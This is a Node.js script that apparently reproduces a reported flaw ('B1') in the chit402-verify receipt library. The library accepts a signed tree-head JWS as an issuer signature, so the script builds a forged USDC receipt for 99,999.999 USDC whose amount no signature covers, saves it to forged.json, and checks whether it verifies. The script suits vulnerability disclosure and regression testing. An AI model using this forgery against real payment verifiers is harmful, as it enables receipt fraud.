#!/usr/bin/env node
// repro-b1.mjs — B1: does chit402-verify accept a KMS-signed TREE-HEAD JWS as
// the issuer signature of a receipt that has no signed economic claims?
//
// Usage: node repro-b1.mjs <path-to-chit402-verify-dir>
//   e.g. node repro-b1.mjs ./v045     (chit402-verify 0.4.5)
//        node repro-b1.mjs ./v048     (chit402-verify 0.4.8)
// Fetches the live receipt + JWKS (public GETs), fabricates the document,
// runs the package's own verifyReceipt offline. Exit 0 when the finding
// fires (overall=verified on a document with no signed payment claims).
import { readFileSync, writeFileSync } from 'node:fs';
import { pathToFileURL } from 'node:url';

const pkgDir = process.argv[2];
if (!pkgDir) {
  console.error('usage: node repro-b1.mjs <chit402-verify dir>');
  process.exit(2);
}
const base = 'https://api.chit402.com';
const RECEIPT_ID = 'chit-56e3ee6d-2acb-4cab-8fa4-dfd5f9f31e6f';

const [receiptRes, jwksRes] = await Promise.all([
  fetch(`${base}/receipt/${RECEIPT_ID}?format=json`),
  fetch(`${base}/.well-known/jwks.json`),
]);
if (!receiptRes.ok || !jwksRes.ok) {
  console.error('fetch failed', receiptRes.status, jwksRes.status);
  process.exit(3);
}
const live = await receiptRes.json();
const jwks = await jwksRes.json();

const treeHeadJws = live.inclusion.signed_head.signature;
const headHeader = JSON.parse(Buffer.from(treeHeadJws.split('.')[0], 'base64url').toString('utf8'));
const headPayload = JSON.parse(Buffer.from(treeHeadJws.split('.')[1], 'base64url').toString('utf8'));
if (headPayload.schema !== 'chit402.tree_head.v2') {
  console.error('live receipt no longer carries a chit402.tree_head.v2 JWS; update RECEIPT_ID');
  process.exit(4);
}
const kid = headHeader.kid;

// The forged document: a legacy payload-version-2 receipt whose ONLY signed
// object is the tree-head JWS. Its outer economic fields (gross_amount
// 99999999 atomic USDC = 99,999.999 USDC) are not covered by any signature.
const forged = {
  schema: 'xfuel.receipt.v3',
  task_id: 'chit-00000000-1111-2222-3333-444444444444',
  payment: { rail: 'usdc', ref: `base:0x${'ab'.repeat(32)}`, gross_amount: '99999999' },
  issuer_signature: {
    alg: 'ES256',
    payload_version: 2,
    kid,
    jws: treeHeadJws,
  },
};
writeFileSync('forged.json', JSON.stringify(forged, null, 2));

// Control: the same document without the tree-head JWS. No signature at all.
const unsignedControl = { ...forged, issuer_signature: undefined };

const pkg = await import(pathToFileURL(`${pkgDir}/dist/index.js`).href);

const run = async (doc) => {
  const r = await pkg.verifyReceipt(doc, { jwks });
  return {
    overall: r.overall,
    errors: r.errors ?? null,
    issuer_signature: r.issuer_signature
      ? { valid: r.issuer_signature.valid, trust: r.issuer_signature.trust ?? null, kid: r.issuer_signature.kid ?? null }
      : null,
  };
};

const forgedResult = await run(forged);
const controlResult = await run(unsignedControl);
console.log(JSON.stringify({ forged: forgedResult, unsigned_control: controlResult }, null, 1));

const fires = forgedResult.overall === 'verified';
console.log(fires
  ? 'B1 FIRES: a tree-head JWS is accepted as the receipt issuer signature; a document with no signed economic claims verifies.'
  : 'B1 does not fire on this version.');
process.exit(fires ? 0 : 1);
